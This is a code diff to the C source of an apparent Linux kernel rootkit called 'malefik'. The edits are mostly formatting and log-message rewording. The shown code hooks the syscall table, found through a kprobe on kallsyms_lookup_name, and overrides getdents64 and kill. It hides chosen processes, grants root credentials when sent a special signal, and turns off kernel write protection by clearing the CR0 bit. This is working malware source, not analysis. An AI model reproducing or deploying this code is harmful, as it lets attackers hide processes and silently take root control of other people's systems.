@@ -1,9 +1,10 @@
-#include <linux/syscalls.h>  
-#include <linux/slab.h>      
-#include <linux/sched.h>     
-#include <linux/fdtable.h>   
+#include <linux/syscalls.h>     
+#include <linux/slab.h>         
+#include <linux/sched.h>        
+#include <linux/fdtable.h>      
 #include <linux/proc_ns.h>	
-#include <linux/dirent.h>	
+#include <linux/kprobes.h>
+#include <linux/dirent.h>
 #include <asm/ptrace.h>		
 
 struct linux_dirent {
@@ -19,13 +20,14 @@ struct linux_dirent {
 #define GET_ROOT 64
 
 unsigned long cr0;
+
 static unsigned long *__sys_call_table;
+
 typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
 
 static tt_syscall orig_getdents64;
 static tt_syscall orig_kill;
 
-#include <linux/kprobes.h>
 static struct kprobe kp = {
             .symbol_name = "kallsyms_lookup_name"
 };
@@ -33,6 +35,7 @@ static struct kprobe kp = {
 unsigned long *get_syscall_table(void)
 {
 	unsigned long *syscall_table;
+
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 	
 	kallsyms_lookup_name_t kallsyms_lookup_name;
@@ -47,6 +50,7 @@ unsigned long *get_syscall_table(void)
 struct task_struct *find_task(pid_t pid)
 {
 	struct task_struct *target_process = current;
+
 	for_each_process(target_process)
 	{
 		if (target_process->pid == pid)
@@ -142,7 +146,6 @@ out:
 	return ret;
 }
 
-
 static void set_root(void)
 {
 	struct cred *root = prepare_creds();
@@ -171,11 +174,13 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 		case HIDE_UNHIDE_PROCESS:
 			if ((task = find_task(pid)) == NULL)
 				return -ESRCH;
+
 			task->flags = task->flags ^ PF_INVISIBLE;
 			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding/unhiding pid: %d \n", pid);
 			break;
 		case GET_ROOT:
-			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ with malefik love :)\t-> here is your root shell!!");
+			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ offering root shell!!\n");
+
 			set_root();
 			break;
 		default:
@@ -194,12 +199,13 @@ static inline void write_cr0_forced(unsigned long val)
 
 static inline void protect_memory(void)
 {
-	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ (memory protected)\n");
+	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ (memory protected): Regainig normal memory protection\n");
 	write_cr0_forced(cr0);
 }
 
 static inline void unprotect_memory(void)
 {
-	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ (Memory unprotected)\n");
+	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ (memory unprotected): Ready for editing Syscall Table");
 	write_cr0_forced(cr0 & ~0x00010000);
 }
+
